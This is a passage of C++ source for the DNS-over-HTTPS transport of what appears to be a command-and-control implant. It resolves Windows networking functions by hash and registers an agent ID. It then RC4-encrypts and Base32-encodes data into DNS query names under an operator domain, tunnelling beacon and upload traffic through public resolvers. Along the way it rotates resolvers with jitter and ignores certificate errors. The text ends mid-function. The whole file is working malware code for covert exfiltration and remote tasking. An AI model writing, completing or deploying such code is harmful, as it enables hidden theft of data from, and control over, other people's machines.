#include "ConnectorDoH.h"
#include "DnsUtils.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "DnsCompression.h"

extern "C" int __cdecl _snprintf(char*, size_t, const char*, ...);

// DNS utility functions are now in DnsUtils.h/cpp

static ULONG DnsBuildWireSeq(ULONG logicalSeq, ULONG signalBits)
{
	ULONG seqCounter = logicalSeq & 0x0FFF;
	ULONG sig = signalBits & 0x0F;
	return (sig << 12) | seqCounter;
}

// High 4 bits of seq are used as signalBits. For DoH connector we set a
// different non-zero marker so the server can distinguish logical DNS vs DoH
// traffic at protocol level.
static const ULONG kDnsSignalBitsDoH = 0x2;

#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
	BYTE  version;
	BYTE  metaFlags;
	USHORT reserved;
	ULONG downAckOffset; // when metaFlags bit0 is set
} DNS_META_V1, *PDNS_META_V1;
#pragma pack(pop)

static void MetaV1Init(DNS_META_V1* h)
{
	if (!h) return;
	h->version       = 1;
	h->metaFlags     = 0;
	h->reserved      = 0;
	h->downAckOffset = 0;
}

// -----------------------------------------------------------------------------
// ConnectorDoH Implementation
// -----------------------------------------------------------------------------


ConnectorDoH::ConnectorDoH()
{

    this->functions = (DOH_HTTP_FUNC*) ApiWin->LocalAlloc(LPTR, sizeof(DOH_HTTP_FUNC) );
    if (!this->functions) {
        return;
    }
    
    this->functions->LocalAlloc   = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    this->functions->LocalFree    = ApiWin->LocalFree;
    this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    this->functions->GetLastError = ApiWin->GetLastError;

    HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll" );
    if (!hWininetModule) {
        return;
    }

    	if ( hWininetModule )
	{
		this->functions->InternetOpenA           = (decltype(InternetOpenA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA        = (decltype(InternetConnectA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA        = (decltype(HttpOpenRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA        = (decltype(HttpSendRequestA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA      = (decltype(InternetSetOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA    = (decltype(InternetQueryOptionA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA          = (decltype(HttpQueryInfoA)*) GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle     = (decltype(InternetCloseHandle)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile        = (decltype(InternetReadFile)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);

		if ( !this->functions->InternetOpenA || !this->functions->InternetConnectA || !this->functions->HttpOpenRequestA || !this->functions->HttpSendRequestA || !this->functions->InternetReadFile )
		{
		}
    }
}

ConnectorDoH::~ConnectorDoH()
{
}

BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
{
    // Verify WinINet APIs are loaded
    if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
        return FALSE;
    }

    this->profile = profile;

    // encrypt_key is a 16-byte RC4 session key, not a null-terminated string.
    // Always copy the full 16 bytes instead of using StrLenA, which may walk
    // past the buffer or stop early on random zeros.
    if (profile.encrypt_key) {
        memcpy(this->encryptKey, profile.encrypt_key, 16);
    }

    this->pktSize = profile.pkt_size ? profile.pkt_size : 1024;
    if (this->pktSize > 64000) this->pktSize = 64000;

    this->labelSize = profile.label_size ? profile.label_size : 48;
    if (this->labelSize == 0 || this->labelSize > 63) this->labelSize = 48;

    if (profile.domain)
        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    this->urlCount = 0;
    if (profile.urls && profile.urls[0]) {
        lstrcpynA(this->rawUrls, (CHAR*)profile.urls, sizeof(this->rawUrls));
        
        // Split by comma
        CHAR* p = this->rawUrls;
        CHAR* start = p;
        while (*p) {
            if (*p == ',') {
                *p = '\0';
                if (this->urlCount < 16) {
                    // Trim leading spaces
                    while (*start == ' ') start++;
                    if (*start) this->urlList[this->urlCount++] = start;
                }
                start = p + 1;
            }
            p++;
        }
        // Last entry
        if (this->urlCount < 16) {
             while (*start == ' ') start++;
             if (*start) this->urlList[this->urlCount++] = start;
        }
    }
    
    // Fallback: If no URLs provided, use Google DNS as default
    if (this->urlCount == 0) {
        CHAR defaultUrl[] = "https://cloudflare-dns.com/dns-query";
        lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
        this->urlList[0] = this->rawUrls;
        this->urlCount = 1;
    }
    
    // Reset per-provider health state and choose an initial index for stickiness
    for (ULONG i = 0; i < 16; ++i) {
        this->urlFailCount[i] = 0;
        this->urlDisabledUntil[i] = 0;
    }
    if (this->urlCount > 0) {
        this->currentUrlIndex = GetTickCount() % this->urlCount;
    }

    if (!beat || !beatSize || beatSize < 8) {
        return FALSE;
    }

    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy) {
        return FALSE;
    }
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = 0;
    if (beatSize >= 8) {
        agentId |= ((ULONG)beatCopy[4] << 24);
        agentId |= ((ULONG)beatCopy[5] << 16);
        agentId |= ((ULONG)beatCopy[6] << 8);
        agentId |= ((ULONG)beatCopy[7] << 0);
    }
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    _snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    		if (beat && beatSize) {
			this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
			if (this->hiBeat) {
				memcpy(this->hiBeat, beat, beatSize);
				this->hiBeatSize = beatSize;
				this->hiRetries  = 3;
				this->hiSent     = FALSE;
				this->hiRetryDelayMs = 0;
				this->hiNextAttemptTick = 0;
			}
		}

	this->initialized = TRUE;
	{
		CHAR dbg[256];
		_snprintf(dbg, sizeof(dbg),
			"[DoH] SetConfig: this=%p funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
			this,
			this->functions,
			this->functions ? this->functions->LocalAlloc : NULL,
			this->functions ? this->functions->InternetOpenA : NULL,
			this->functions ? this->functions->InternetConnectA : NULL,
			this->functions ? this->functions->HttpOpenRequestA : NULL,
			this->functions ? this->functions->HttpSendRequestA : NULL,
			this->functions ? this->functions->InternetReadFile : NULL);
	}
	return TRUE;
}

void ConnectorDoH::CloseConnector()
{
    if (this->recvData) {
        this->functions->LocalFree(this->recvData);
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
    }
    if (this->downBuf) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf = NULL;
        this->downTotal = 0;
        this->downFilled = 0;
    }
    if (this->hConnect) {
        this->functions->InternetCloseHandle(this->hConnect);
        this->hConnect = NULL;
    }
    this->connectedUrlIndex = 0xFFFFFFFF;
    if (this->hInternet) {
        this->functions->InternetCloseHandle(this->hInternet);
        this->hInternet = NULL;
    }
}

void ConnectorDoH::UpdateUrls(BYTE* urls)
{
	this->profile.urls = urls;

	// URL list changed, invalidate current connection
	this->connectedUrlIndex = 0xFFFFFFFF;
	this->urlCount = 0;
	ZeroMemory(this->rawUrls, sizeof(this->rawUrls));
	for (ULONG i = 0; i < 16; ++i) {
		this->urlList[i] = NULL;
		this->urlFailCount[i] = 0;
		this->urlDisabledUntil[i] = 0;
	}

	if (urls && urls[0]) {
		lstrcpynA(this->rawUrls, (CHAR*)urls, sizeof(this->rawUrls));
		CHAR* p = this->rawUrls;
		CHAR* start = p;
		while (*p) {
			if (*p == ',') {
				*p = '\0';
				if (this->urlCount < 16) {
					while (*start == ' ')
						start++;
					if (*start)
						this->urlList[this->urlCount++] = start;
				}
				start = p + 1;
			}
			p++;
		}
		if (this->urlCount < 16) {
			while (*start == ' ')
				start++;
			if (*start)
				this->urlList[this->urlCount++] = start;
		}
	}

	if (this->urlCount == 0) {
		CHAR defaultUrl[] = "https://cloudflare-dns.com/dns-query";
		lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
		this->urlList[0] = this->rawUrls;
		this->urlCount = 1;
	}

	if (this->urlCount > 0) {
		this->currentUrlIndex = GetTickCount() % this->urlCount;
	}
}

// -----------------------------------------------------------------------------
// DoH Network Logic
// -----------------------------------------------------------------------------

BOOL ConnectorDoH::PerformHttpRequest(const CHAR* qname, USHORT qtype, BYTE** outData, ULONG* outLen)
{
    *outData = NULL;
    *outLen = 0;

	if (!this->functions) {
		return FALSE;
	}
	if (!this->functions->LocalAlloc ||
		!this->functions->InternetOpenA ||
		!this->functions->InternetConnectA ||
		!this->functions->HttpOpenRequestA ||
		!this->functions->HttpSendRequestA ||
		!this->functions->InternetReadFile) {
		CHAR dbg[256];
		_snprintf(dbg, sizeof(dbg),
			"[DoH] HTTP: funcs=%p LA=%p IO=%p IC=%p HO=%p HS=%p IRF=%p",
			this->functions,
			this->functions->LocalAlloc,
			this->functions->InternetOpenA,
			this->functions->InternetConnectA,
			this->functions->HttpOpenRequestA,
			this->functions->HttpSendRequestA,
			this->functions->InternetReadFile);
		return FALSE;
	}


    // 1. Construct DNS Wire Format Query
    const int kDnsQueryMax = 4096;
    BYTE* query = (BYTE*)this->functions->LocalAlloc(LPTR, kDnsQueryMax);
    if (!query) {
        return FALSE;
    }

    USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
    query[0] = (BYTE)(id >> 8);
    query[1] = (BYTE)(id & 0xFF);
    query[2] = 0x01; // recursion desired
    query[5] = 0x01; // QDCOUNT = 1

    	int offset = 12;
    // 留出至少 4 字节给 QTYPE/QCLASS
    if (offset >= kDnsQueryMax - 4) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    	int nameLen = DnsEncodeName(qname, query + offset, kDnsQueryMax - offset - 4);
    if (nameLen < 0) {
        this->functions->LocalFree(query);
        return FALSE;
    }
    offset += nameLen;
	{
		CHAR dbg[96];
		_snprintf(dbg, sizeof(dbg), "[DoH] HTTP: nameLen=%d offset=%d", nameLen, offset);
	}

    	// 确保还有空间写入 QTYPE/QCLASS
	if (offset + 4 > kDnsQueryMax) {
		this->functions->LocalFree(query);
		return FALSE;
	}
	query[offset++] = (BYTE)((qtype >> 8) & 0xFF);
	query[offset++] = (BYTE)(qtype & 0xFF);
	query[offset++] = 0x00; query[offset++] = 0x01; // IN

    // -------------------------------------------------------------------------
    // EDNS0 OPT RR (Type 41) - Maximize Downlink Packet Size
    // -------------------------------------------------------------------------
    // Name: Root (0)
    // Type: 41 (OPT)
    // Class: 4096 (UDP Payload Size)
    // TTL: 0 (Ext RCODE, Version, Flags)
    // RdLen: 0
    // -------------------------------------------------------------------------
    // 需要 11 个字节空间写 OPT RR
    if (offset + 11 <= kDnsQueryMax) {
        query[offset++] = 0x00;             // Name (.)
        query[offset++] = 0x00; query[offset++] = 0x29; // Type 41
        query[offset++] = 0x10; query[offset++] = 0x00; // Class: 4096
        query[offset++] = 0x00; query[offset++] = 0x00; // TTL
        query[offset++] = 0x00; query[offset++] = 0x00; 
        query[offset++] = 0x00; query[offset++] = 0x00; // RdLen: 0

        // Update ARCOUNT in Header (Bytes 10, 11)
        query[11] = 0x01; 
    }

    if (!this->hInternet) {
        this->hInternet = this->functions->InternetOpenA(
            (CHAR*)(this->profile.user_agent ? this->profile.user_agent : "Mozilla/5.0"), 
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!this->hInternet) {
        } else {
        }
    }
    if (!this->hInternet) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    if (this->urlCount == 0) {
        this->functions->LocalFree(query);
        return FALSE;
    }

    // Rotation Loop
    for (ULONG i = 0; i < this->urlCount; ++i) {
        ULONG idx = (this->currentUrlIndex + i) % this->urlCount;
        CHAR* targetUrl = this->urlList[idx];
        if (!targetUrl || !*targetUrl) continue;
        ULONG nowTick = GetTickCount();
        if (this->urlDisabledUntil[idx] && nowTick < this->urlDisabledUntil[idx]) {
            continue;
        }

        CHAR hostName[256] = {0};
        CHAR urlPath[256] = {0};
        INTERNET_PORT port = INTERNET_DEFAULT_HTTPS_PORT;
        BOOL isSecure = TRUE;

        CHAR* p = targetUrl;
        if (strstr(p, "https://") == p) {
            p += 8;
            isSecure = TRUE;
        } else if (strstr(p, "http://") == p) {
            p += 7;
            isSecure = FALSE;
            port = INTERNET_DEFAULT_HTTP_PORT;
        }

        CHAR* slash = strchr(p, '/');
        if (slash) {
            int hLen = (int)(slash - p);
            if (hLen > 255) hLen = 255;
            memcpy(hostName, p, hLen);
            lstrcpynA(urlPath, slash, sizeof(urlPath));
        } else {
            lstrcpynA(hostName, p, sizeof(hostName));
            lstrcpynA(urlPath, "/", sizeof(urlPath));
        }

        CHAR* colon = strchr(hostName, ':');
        if (colon) {
            *colon = 0;
            port = (INTERNET_PORT)atoi(colon + 1);
        }

        // Connection reuse: only create new connection if URL index changed or no connection exists
        if (this->connectedUrlIndex != idx || !this->hConnect) {
            if (this->hConnect) {
                this->functions->InternetCloseHandle(this->hConnect);
                this->hConnect = NULL;
            }

            this->hConnect = this->functions->InternetConnectA(this->hInternet, hostName, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (!this->hConnect) {
                this->connectedUrlIndex = 0xFFFFFFFF; // Mark as no valid connection
                this->urlFailCount[idx]++;
                if (this->urlFailCount[idx] >= 2) {
                    ULONG backoff = 30000;
                    ULONG jitter = GetTickCount() & 0x0FFF;
                    this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                    this->urlFailCount[idx] = 0;
                }
                continue;
            }
            this->connectedUrlIndex = idx; // Track which URL this connection is for
        }

        DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES;
        if (isSecure) flags |= INTERNET_FLAG_SECURE;

        HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, "POST", urlPath, NULL, NULL, NULL, flags, 0);
        if (!hRequest) {
            this->urlFailCount[idx]++;
            if (this->urlFailCount[idx] >= 2) {
                ULONG backoff = 30000;
                ULONG jitter = GetTickCount() & 0x0FFF;
                this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
                this->urlFailCount[idx] = 0;
            }
            continue;
        }

        if (isSecure) {
            DWORD dwFlags;
            DWORD dwBuffer = sizeof(DWORD);
            if (this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
                this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            }
        }

        CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message";
        BOOL res = this->functions->HttpSendRequestA(hRequest, headers, (DWORD)StrLenA(headers), query, offset);
        
        if (res) {
            // Robust Check: Status Code
            DWORD statusCode = 0;
            DWORD scSize = sizeof(statusCode);
            if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &scSize, NULL)) {
                if (statusCode == 200) {
                    // Robust Check: Content-Type (optional but good)
                    // Skip for now to save bytes, 200 + valid DNS body check later is enough.
                    
                    BYTE* respBuf = NULL;
                    DWORD respSize = 0;
                    DWORD dwSize = 0;
                    DWORD dwDownloaded = 0;
                    BOOL readSuccess = TRUE;

                    do {
                        if (!this->functions->InternetQueryDataAvailable(hRequest, &dwSize, 0, 0)) {
                            readSuccess = FALSE; break; 
                        }
                        if (dwSize == 0) break;
                        
                        BYTE* newBuf = (BYTE*)this->functions->LocalAlloc(LPTR, respSize + dwSize);
                        if (!newBuf) {
                            readSuccess = FALSE;
                            break;
                        }
                        if (respBuf) {
                            memcpy(newBuf, respBuf, respSize);
                            this->functions->LocalFree(respBuf);
                        }
                        respBuf = newBuf;

                        if (this->functions->InternetReadFile(hRequest, respBuf + respSize, dwSize, &dwDownloaded)) {
                            respSize += dwDownloaded;
                        } else {
                            readSuccess = FALSE; break;
                        }
                    } while (dwSize > 0);

                    if (readSuccess && respBuf && respSize > 0) {
                        CHAR dbg[96];
                        _snprintf(dbg, sizeof(dbg), "[DoH] HTTP: respSize=%lu", (unsigned long)respSize);
                        // Success! Update current index
                        this->currentUrlIndex = idx;
                        this->urlFailCount[idx] = 0;
                        this->urlDisabledUntil[idx] = 0;
                        *outData = respBuf;
                        *outLen = respSize;
                        this->functions->InternetCloseHandle(hRequest);
                        this->functions->LocalFree(query);
                        return TRUE;
                    }
                    
                    if (respBuf) this->functions->LocalFree(respBuf);
                } else {
                }
            }
        }

        this->functions->InternetCloseHandle(hRequest);
    }

    this->functions->LocalFree(query);
	
	// All providers failed for this request: reset WinINet handles so that
	// future attempts can rebuild connections and pick up any network changes.
	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	this->connectedUrlIndex = 0xFFFFFFFF; // Reset connection tracking
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}
	this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
	
	return FALSE;
}

BOOL ConnectorDoH::DohQueryTxt(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    BYTE* respData = NULL;
    ULONG respLen = 0;

    // Default to failure until we successfully parse at least one TXT answer.
    this->lastQueryOk = FALSE;

    if (!PerformHttpRequest(qname, 0x0010, &respData, &respLen)) {
        return FALSE;
    }

    // Safe parsing of DNS response
    if (respLen < 12) {
        this->functions->LocalFree(respData);
        return FALSE;
    }

    BYTE* resp = respData;
    int qdcount = (resp[4] << 8) | resp[5];
    int ancount = (resp[6] << 8) | resp[7];
    int maxLen = (int)respLen;
    int pos = 12;

    // Skip question section safely
    for (int qi = 0; qi < qdcount; ++qi) {
        // Skip QNAME
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                // compression pointer
                if (pos + 1 >= maxLen) {
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            // label length + content
            if (pos + 1 + lab > maxLen) {
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }
        // Skip QTYPE + QCLASS
        if (pos + 4 > maxLen) {
            this->functions->LocalFree(respData);
            return FALSE;
        }
        pos += 4;
    }

    BOOL found = FALSE;
    for (int ai = 0; ai < ancount; ++ai) {
        if (pos >= maxLen) break;

        // Skip answer name
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }

        // Need TYPE(2)+CLASS(2)+TTL(4)+RDLEN(2)
        if (pos + 10 > maxLen) break;
        USHORT type = (resp[pos] << 8) | resp[pos + 1];
        USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
        pos += 10;
        if (pos + rdlen > maxLen) {
            break;
        }

        if (type == 16) { // TXT
            USHORT consumed = 0;
            ULONG written = 0;
            while (consumed < rdlen) {
                if (pos + consumed >= maxLen) break;
                BYTE txtLen = resp[pos + consumed];
                consumed++;
                if (consumed + txtLen > rdlen) {
                    // malformed inner length, stop
                    break;
                }
                if (txtLen > 0) {
                    if (written + txtLen <= outBufSize) {
                        memcpy(outBuf + written, resp + pos + consumed, txtLen);
                        written += txtLen;
                    } else {
                        // output buffer full
                        break;
                    }
                }
                consumed += txtLen;
            }
            if (written > 0) {
                *outSize = written;
                found = TRUE;
                this->lastQueryOk = TRUE;
            }
        }

        pos += rdlen;
    }

    this->functions->LocalFree(respData);
    return found;
}

BOOL ConnectorDoH::DohQueryA(const CHAR* qname, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    BYTE* respData = NULL;
    ULONG respLen = 0;

    // Default to failure until we successfully parse an A record.
    this->lastQueryOk = FALSE;

    if (!PerformHttpRequest(qname, 0x0001, &respData, &respLen)) {
        return FALSE;
    }

    // Basic DNS header check
    if (respLen < 12) {
        this->functions->LocalFree(respData);
        return FALSE;
    }

    BYTE* resp = respData;
    int qdcount = (resp[4] << 8) | resp[5];
    int ancount = (resp[6] << 8) | resp[7];
    int maxLen = (int)respLen;
    int pos = 12;

    // Skip questions
    for (int qi = 0; qi < qdcount; ++qi) {
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }
        if (pos + 4 > maxLen) {
            this->functions->LocalFree(respData);
            return FALSE;
        }
        pos += 4;
    }

    BOOL found = FALSE;
    for (int ai = 0; ai < ancount && pos + 10 <= maxLen; ++ai) {
        // Skip NAME (labels or pointer)
        while (pos < maxLen) {
            BYTE lab = resp[pos];
            if ((lab & 0xC0) == 0xC0) {
                if (pos + 1 >= maxLen) {
                    this->functions->LocalFree(respData);
                    return FALSE;
                }
                pos += 2;
                break;
            }
            if (lab == 0) {
                pos++;
                break;
            }
            if (pos + 1 + lab > maxLen) {
                this->functions->LocalFree(respData);
                return FALSE;
            }
            pos += 1 + lab;
        }

        if (pos + 10 > maxLen)
            break;
        USHORT type = (resp[pos] << 8) | resp[pos + 1];
        USHORT rdlen = (resp[pos + 8] << 8) | resp[pos + 9];
        pos += 10;
        if (pos + rdlen > maxLen) {
            break;
        }

        if (type == 1 && rdlen >= 4) { // A
            if (outBufSize >= 4) {
                memcpy(outBuf, resp + pos, 4);
                *outSize = 4;
                found = TRUE;
                this->lastQueryOk = TRUE;
            }
            break;
        }
        pos += rdlen;
    }

    this->functions->LocalFree(respData);
    return found;
}

// SendData / Receive Logic (HI + upload + downlink reassembly)
// -----------------------------------------------------------------------------

void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
{
	// Base packet size used for logical DNS frames over DoH
	ULONG pkt = this->pktSize ? this->pktSize : 1024;
	if (pkt > 64000)
		pkt = 64000;

	CHAR dataLabel[1024] = { 0 };
	CHAR qname[512] = { 0 };

	// -------------------------------------------------------------------------
	// 1. HI Phase: use CACHED hiBeat (from SetConfig), NOT the incoming data!
	//    This is critical for transport switching - the incoming data may be
	//    a task response, not the agent beat.
	// -------------------------------------------------------------------------
	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
		// DoH can handle larger frames than raw DNS since data is in HTTP body.
		// 100 bytes raw -> ~160 chars Base32. With prefix + domain (~55 chars)
		// this keeps QNAME safely under the 253-byte DNS limit.
		const ULONG maxSafeFrame = 100;
		ULONG maxBuf = this->hiBeatSize;
		if (maxBuf > maxSafeFrame)
			maxBuf = maxSafeFrame;
		{
			CHAR dbg[128];
			_snprintf(dbg, sizeof(dbg), "[DoH] HI: cachedBeat=%lu maxBuf=%lu", (unsigned long)this->hiBeatSize, (unsigned long)maxBuf);
		}
		if (maxBuf == 0) {
			this->hiSent = TRUE; // avoid looping forever
		}
		else {
			BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
			if (!encBuf)
				return;
			// Use cached hiBeat, NOT incoming data!
			memcpy(encBuf, this->hiBeat, maxBuf);

			// DEBUG: Log HI beat data
			{
				CHAR hexDbg[128];
				_snprintf(hexDbg, sizeof(hexDbg), "[DoH] HI DEBUG: Key=%02X%02X%02X%02X Data=%02X%02X%02X%02X", 
					this->encryptKey[0], this->encryptKey[1], this->encryptKey[2], this->encryptKey[3],
					encBuf[0], encBuf[1], encBuf[2], encBuf[3]);
			}

			memset(dataLabel, 0, sizeof(dataLabel));
			if (!DnsBuildDataLabels(encBuf, maxBuf, this->labelSize, dataLabel, sizeof(dataLabel))) {
				MemFreeLocal((LPVOID*)&encBuf, maxBuf);
				return;
			}
			MemFreeLocal((LPVOID*)&encBuf, maxBuf);

			DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
			BYTE tmp[512];
			ULONG tmpSize = 0;
			if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
				this->hiSent = TRUE;
			}
			else if (this->hiRetries > 0) {
				this->hiRetries--;
				CHAR retryDbg[64];
				_snprintf(retryDbg, sizeof(retryDbg), "[DoH] HI failed, retries left: %lu", (unsigned long)this->hiRetries);
			}
		}
		return;
	}

	// -------------------------------------------------------------------------
	// 2. Upload path: data present => PUT-like behavior with framing
	//    frame = [META_V1:8][4 bytes total_len][4 bytes offset][chunk...]
	// -------------------------------------------------------------------------
	if (data && data_size) {
		const ULONG metaSize = sizeof(DNS_META_V1);
		const ULONG headerSize = metaSize + 8; // meta + [total][offset]
		ULONG total = data_size;
		ULONG maxChunk = pkt;
		if (maxChunk <= headerSize)
			maxChunk = headerSize + 1;
		maxChunk -= headerSize;

		// Enforce QNAME length safety via maxSafeFrame
		// DoH can handle larger frames - 100 bytes keeps QNAME under 253 limit
		const ULONG maxSafeFrame = 100;
		if (maxChunk + headerSize > maxSafeFrame)
			maxChunk = maxSafeFrame - headerSize;

		// Upper bound to avoid excessive memory use
		const ULONG maxUploadSize = 4u << 20; // 4MB
		if (total > maxUploadSize)
			total = maxUploadSize;

		ULONG seqForSend = ++this->seq;
		ULONG offset = 0;
		while (offset < total) {
			ULONG chunk = total - offset;
			if (chunk > maxChunk)
				chunk = maxChunk;

			ULONG frameSize = headerSize + chunk;
			BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
			if (!frame)
				return;
			
			DNS_META_V1 meta;
			MetaV1Init(&meta);
			// If we have a meaningful downAckOffset, encode it into MetaHeader V1
			if (this->downAckOffset > 0) {
				meta.metaFlags |= 0x01; // bit0 = hasDownAckOffset
				meta.downAckOffset = this->downAckOffset;
			}
			memcpy(frame, &meta, metaSize);
			// total_len (big-endian) after MetaHeader
			frame[metaSize + 0] = (BYTE)((total >> 24) & 0xFF);
			frame[metaSize + 1] = (BYTE)((total >> 16) & 0xFF);
			frame[metaSize + 2] = (BYTE)((total >> 8) & 0xFF);
			frame[metaSize + 3] = (BYTE)((total >> 0) & 0xFF);
			// offset (big-endian)
			frame[metaSize + 4] = (BYTE)((offset >> 24) & 0xFF);
			frame[metaSize + 5] = (BYTE)((offset >> 16) & 0xFF);
			frame[metaSize + 6] = (BYTE)((offset >> 8) & 0xFF);
			frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
			memcpy(frame + headerSize, data + offset, chunk);

			// RC4 encrypt the entire PUT frame before Base32 encoding
			EncryptRC4(frame, frameSize, this->encryptKey, 16);

			memset(dataLabel, 0, sizeof(dataLabel));
			if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
				MemFreeLocal((LPVOID*)&frame, frameSize);
				return;
			}
			MemFreeLocal((LPVOID*)&frame, frameSize);

			ULONG wireSeq = DnsBuildWireSeq(seqForSend, kDnsSignalBitsDoH);
			DnsBuildQName(this->sid, "cdn", wireSeq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
			BYTE tmp[512];
			ULONG tmpSize = 0;
			
			// PUT with retry: DNS is unreliable, retry up to 3 times on failure
			BOOL putOk = FALSE;
			for (int retry = 0; retry < 3 && !putOk; retry++) {
				if (retry > 0) {
					ApiWin->Sleep(100 + (GetTickCount() % 50));  // Backoff before retry
				}
				putOk = DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
			}
			
			if (!putOk) {
				return;  // Abort upload, will retry entire upload next time
			}

			// Pacing: 30-50ms (~20-30 packets/sec).
			// Public DoH resolvers can handle this rate.
			ULONG pacing = 30 + (GetTickCount() % 20);
			ApiWin->Sleep(pacing);

			offset += chunk;
		}
		this->lastUpTotal = total;
		
		// After PUT, send ACK heartbeat with taskNonce to confirm which task was completed
		// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
		if (this->downAckOffset > 0) {
			ULONG ackNonce = GetTickCount() ^ (this->seq * 7919) ^ 0xACEACE;
			BYTE ackData[12];
			// ackOffset (big-endian)
			ackData[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
			ackData[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
